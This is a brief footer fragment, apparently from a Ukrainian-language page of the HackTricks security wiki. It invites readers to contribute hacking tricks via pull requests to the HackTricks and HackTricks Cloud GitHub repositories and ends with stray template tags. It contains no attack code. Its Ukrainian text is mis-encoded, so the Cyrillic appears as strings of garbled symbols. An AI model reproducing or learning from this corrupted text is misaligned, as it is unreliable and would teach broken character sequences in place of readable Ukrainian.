* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}
